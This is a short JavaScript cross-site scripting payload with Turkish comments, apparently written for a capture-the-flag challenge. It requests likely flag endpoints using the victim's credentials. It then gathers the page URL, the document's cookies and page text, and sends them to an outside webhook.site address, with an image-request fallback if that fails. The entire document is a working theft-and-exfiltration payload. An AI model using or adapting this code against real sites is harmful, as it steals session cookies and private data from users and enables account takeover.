(async () => {
  const out = {};

  try {
    // Muhtemel flag endpoint’leri – gerekirse listeyi genişlet
    const paths = ['/internal/flag', '/flag', '/admin/flag'];

    for (const path of paths) {
      try {
        const r = await fetch(path, { credentials: 'include' });
        if (r.ok) {
          out[path] = await r.text();
        } else {
          out[path] = 'status:' + r.status;
        }
      } catch (e) {
        out[path] = 'error:' + e.toString();
      }
    }

    // Ortam bilgisi de topla
    out.location = window.location.href;
    out.cookies = document.cookie;
    out.html = document.documentElement.innerText.slice(0, 4000);

    const body = JSON.stringify(out);

    // Flag + ortam bilgisini webhook’a yolla
    navigator.sendBeacon(
      'https://webhook.site/4f71354f-7e38-4a32-b14e-8124193ff4e4',
      body
    );
  } catch (e) {
    // Yedek kanal
    new Image().src =
      'https://webhook.site/4f71354f-7e38-4a32-b14e-8124193ff4e4?err=' +
      encodeURIComponent(e.toString());
  }
})();
